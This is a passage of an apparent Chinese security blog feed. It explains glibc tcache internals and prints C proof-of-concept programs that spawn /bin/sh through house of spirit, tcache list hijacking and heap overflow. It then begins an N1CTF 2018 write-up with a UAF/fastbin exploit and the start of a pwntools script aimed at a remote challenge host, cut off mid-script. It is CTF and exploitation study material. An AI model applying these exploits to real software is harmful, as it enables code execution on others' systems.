class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="最大值限制"><a href="#最大值限制" class="headerlink" title="最大值限制"></a>最大值限制</h3><p>在循环处理unsorted bin内存块是，如果达到放入unsorted bin块最大数量时，会立即返回。默认是0，即不存在上限。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If we've processed as many chunks as we're allowed while</span></span><br><span class="line"><span class="comment"> filling the cache, return one of the cached ones.  */</span></span><br><span class="line">      ++tcache_unsorted_count;</span><br><span class="line">      <span class="keyword">if</span> (return_cached</span><br><span class="line">  &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span></span><br><span class="line">  &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><h3 id="unsorted-bin处理结束"><a href="#unsorted-bin处理结束" class="headerlink" title="unsorted bin处理结束"></a>unsorted bin处理结束</h3><p>在循环处理unsorted bin内存块后，如果之前曾放入过tcache块，则会取出一个并返回。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If all the small chunks we found ended up cached, return one now.  */</span></span><br><span class="line">      <span class="keyword">if</span> (return_cached)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>​</p><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><h2 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h2><p>当tcache存在时，释放堆块没有对堆块的前后堆块进行合法性校验，只需要构造本块对齐就可以成功将任意构造的堆块释放到tcache中，而在申请时，tcache对内部大小合适的堆块也是直接分配的，并且对于在tcache内任意大小的堆块管理方式是一样的，导致常见的house_of_spirit可以延伸到smallbin。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">size_t</span> INTERNAL_SIZE_T;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">    INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">    INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">mchunkptr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> fake_chunk_and_more[<span class="number">64</span>];</span><br><span class="line">    <span class="keyword">void</span> (* c)(<span class="keyword">char</span> *) ;</span><br><span class="line">    fake_chunk_and_more[<span class="number">5</span>] = (<span class="keyword">size_t</span> )<span class="built_in">puts</span>; <span class="comment">//If a funtion ptr stored here...</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"This example showcases how the House of Spirit became more powerful "</span> \</span><br><span class="line">            <span class="string">" after the tcache patch\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Filling space at and after the fake chunk with invalid data\n"</span>);</span><br><span class="line">    <span class="built_in">memset</span>(fake_chunk_and_more, <span class="string">'A'</span>, <span class="keyword">sizeof</span>(fake_chunk_and_more));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Building fake chunk on the stack at %p\n"</span>, (<span class="keyword">void</span> *)fake_chunk_and_more);</span><br><span class="line">    mchunkptr fake_chunk = (mchunkptr)(<span class="keyword">void</span> *)fake_chunk_and_more;</span><br><span class="line">    fake_chunk-&gt;size = <span class="number">0x90</span>;</span><br><span class="line">    <span class="keyword">void</span> *mem = (<span class="keyword">void</span>*)((<span class="keyword">char</span>*)fake_chunk + offsetof(struct malloc_chunk, fd));</span><br><span class="line">    <span class="built_in">free</span>(mem);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Passed chunk to free, let's make an allocation for the fake size\n"</span>);</span><br><span class="line">    <span class="keyword">size_t</span> *mem2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    mem2[<span class="number">3</span>] = (<span class="keyword">size_t</span> )system;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc(0x80) returned: %p\n"</span>, mem2);</span><br><span class="line">    c = fake_chunk_and_more[<span class="number">5</span>];  </span><br><span class="line">    (*c)(<span class="string">"/bin/sh"</span>);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="tcache链表劫持"><a href="#tcache链表劫持" class="headerlink" title="tcache链表劫持"></a>tcache链表劫持</h2><p>可以发现，tcache链表的插入和摘除方式与fastbin是基本一致的，也同样可以对tcache的链表进行劫持，并且，由于分配内存时对size没有任何校验。因此，比fastbin dup更容易利用。</p>   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> *chunksizep(<span class="keyword">void</span> *mem) &#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">size_t</span> *)(((<span class="keyword">char</span> *)mem) - <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">void</span> (* c[<span class="number">6</span>])(<span class="keyword">char</span> *) ;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"If there is a function ptr array here: %p\n"</span>,c);</span><br><span class="line">    c[<span class="number">3</span>] = <span class="built_in">puts</span>;</span><br><span class="line">    <span class="keyword">void</span> *mem = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc a chunk here , %p. then free it\n "</span>,mem);</span><br><span class="line">    tcache_entry *victim = (tcache_entry *)mem;</span><br><span class="line">    <span class="built_in">free</span>(mem);</span><br><span class="line">    victim-&gt;next = (<span class="keyword">void</span> *)c; </span><br><span class="line">    <span class="keyword">size_t</span> *mem1 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="keyword">size_t</span> *mem2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc twice,get addr 1: %p,2: %p\n"</span>,mem1,mem2);</span><br><span class="line">    mem2[<span class="number">3</span>] = (<span class="keyword">size_t</span> )system;</span><br><span class="line">    (*c[<span class="number">3</span>])(<span class="string">"/bin/sh"</span>); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h2><p>不完全应用于堆溢出，当内存块释放前，size位置被修改为任意包含在tcache范围内时，在释放后都可以被放置在tcache相应位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class"> &#123;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line"> &#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">size_t</span> *chunksizep(<span class="keyword">void</span> *mem) &#123;</span><br><span class="line">     <span class="keyword">return</span> (<span class="keyword">size_t</span> *)(((<span class="keyword">char</span> *)mem) - <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>));</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">     <span class="keyword">size_t</span>  *a = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">     <span class="keyword">size_t</span>  *b = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">     <span class="keyword">size_t</span>  *c = <span class="built_in">malloc</span>(<span class="number">0x48</span>);    </span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"first , we malloc 3 chunks,1: %p,2: %p,3: %p\n"</span>,a,b,c);</span><br><span class="line">     <span class="keyword">void</span> (* ptr)(<span class="keyword">char</span> *) ;</span><br><span class="line">     *c = <span class="built_in">puts</span>;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"overflow....\n"</span>);</span><br><span class="line">     <span class="built_in">memset</span>(a, <span class="string">'a'</span>, <span class="number">0x48</span>+<span class="number">1</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"free middle of the three\n "</span>);</span><br><span class="line">     <span class="built_in">free</span>(b);</span><br><span class="line">     <span class="keyword">size_t</span> * d = <span class="built_in">malloc</span>(<span class="number">0x58</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"then malloc a bigger chunk:%p\n "</span>,d);</span><br><span class="line">     d[<span class="number">0x58</span>/<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)<span class="number">-1</span>] = system;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"%p,%p"</span>,c,&amp;d[<span class="number">0x58</span>/<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)<span class="number">-1</span>]);</span><br><span class="line">     ptr = *c;</span><br><span class="line">     (*ptr)(<span class="string">"/bin/sh"</span>); </span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><p>此外，对于small bin大小的堆块，在smallbin中包含有空闲块的时候，会同时将同大小的其他空闲块，放入tcache中，此时也会出现解链操作，但相比于unlink宏，缺少了链完整性校验。因此，原本unlink操作在该条件下也可以使用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (check_action, <span class="string">"corrupted size vs. prev_size"</span>, P, AV);  \</span><br><span class="line">    FD = P-&gt;fd;      \</span><br><span class="line">    BK = P-&gt;bk;      \</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  \</span><br><span class="line">    <span class="keyword">else</span> &#123;      \</span><br><span class="line">        FD-&gt;bk = BK;      \</span><br><span class="line">        BK-&gt;fd = FD;      \</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))      \</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;      \</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)      \</span><br><span class="line">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">      malloc_printerr (check_action,      \</span><br><span class="line">       <span class="string">"corrupted double-linked list (not small)"</span>,    \</span><br><span class="line">       P, AV);      \</span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;      \</span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)      \</span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      \</span><br><span class="line">                <span class="keyword">else</span> &#123;      \</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      \</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      \</span><br><span class="line">                  &#125;      \</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;      \</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span><br><span class="line">              &#125;      \</span><br><span class="line">          &#125;      \</span><br><span class="line">      &#125;      \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，在tcache满的时候释放几个堆块到small bin中，再将原本的堆块malloc回去，使得tcache为空。再次malloc时，会从smallbin中分配，此时会把刚释放的同等大小堆块移入tcache中，此时会出现unlink。</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="http://tukan.farm/2017/07/08/tcache/" target="_blank" rel="noopener">http://tukan.farm/2017/07/08/tcache/</a></p><p><a href="http://ftp.gnu.org/gnu/glibc/" target="_blank" rel="noopener">http://ftp.gnu.org/gnu/glibc/</a></p><p>34C3 CTF —— SimpleGC</p>]]></content>
    
    <summary type="html">
    
      tcache，全称是thread local caching，是libc 2.26版本中新增加的内存管理机制，属于一种缓存机制，处理逻辑位于malloc函数和free函数中，优先级较高，第一次见到这个结构是在34C3 CTF中的SimpleGC一题。本文对tcache机制从源码进行了解读。
    
    </summary>
    
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
      <category term="Linux" scheme="http://p4nda.top/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>N1CTF 2018 &amp;&amp; 线程堆知识源代码分析</title>
    <link href="http://p4nda.top/2018/03/15/n1ctf2018/"/>
    <id>http://p4nda.top/2018/03/15/n1ctf2018/</id>
    <published>2018-03-15T13:40:25.000Z</published>
    <updated>2018-07-05T13:43:01.315Z</updated>
    
    <content type="html"><![CDATA[<p>Nu1L队组织的一场国际赛，涉及的知识面很广，仅记录PWN题的第一道和第二道。</p><h1 id="vote"><a href="#vote" class="headerlink" title="vote"></a>vote</h1><p>一道比较常规套路的fastbin利用方法，主要涉及的知识是fastbin堆块的劫持。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目是一个投票系统，主要包括5个函数：</p><p><img src="/img/n1ctf2018/1-1.png" alt=""></p><p>涉及的数据结构是投票者的票数和名字：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0             8                16                 ...</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">| number      |     time       |   name  .........  | </span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p>这里的投票函数实现的很诡异，创建了一个新的线程，线程利用一个bss段上的变量传递线程参数，sleep 等待3s开始投票，出现一个问题，当在3s内有另外的投票时，会造成竞争条件，使第一人的票数投到第二人上。</p><p><img src="/img/n1ctf2018/1-2.png" alt=""></p><p><img src="/img/n1ctf2018/1-3.png" alt=""></p><p>说到诡异，这个取消函数就更诡异了，显然里面有一个UAF以及double free漏洞：</p><p><img src="/img/n1ctf2018/1-4.png" alt=""></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h3><p>利用UAF漏洞，首先申请一个超过global_max_fast的漏洞，这样在释放时，堆块会放到unsorted bin中，在unsorted bin的组织结构中，堆块的fd、bk指针会填充为main_arena+88这个地址，因而泄露了libc的地址。注意防止释放时被top块合并就好了。</p><h3 id="Fastbin劫持"><a href="#Fastbin劫持" class="headerlink" title="Fastbin劫持"></a>Fastbin劫持</h3><p>同样还是利用UAF漏洞，fastbin是一个单链表结构，当可以控制一个堆块的fd指针的时候基本就可以实现任意地址分配。</p><p>首先，分配两个<strong>大小为0x70</strong> 的堆块，并且顺序释放，这样在fastbin中会形成单链表结构，单链表的第二块指向第一块的堆头。</p><p>这里的一个比较新的点是，这题的数据结构无法直接修改fd指针，但是由于UAF漏洞，当对一个已释放用户投票时，仍然修改了堆块的fd指针，理论上可以指向任意位置。</p><p>这里我选择将fd指针指向原位置+0x20的地址，因为这个地方可以编辑（上一个用户的name字段），因而伪造一个堆块，就可以再将fastbin劫持到其他地方，选择将堆块劫持到 __malloc_hook - 0x23的位置，这个位置是非页对齐的，但是在分配地址时并不检测，而且在libc 2.23库中，此处存在多个libc地址，当非页对齐看时，此处就有一个0x7f，恰好可绕过fastbin的size检测，另外还有一个malloc_assert检测，非常恰巧的一个值。</p><p>当可以控制__malloc_hook，将其覆盖为one_gadget，就可以直接通过malloc新的堆块来得到shell了。</p><h3 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time,base64</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./vote'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./vote'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)#,'b*0x0400F6D'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'47.90.103.10'</span>,<span class="number">6000</span>)<span class="comment">#process('./pwn1')</span></span><br><span class="line">libc = ELF(<span 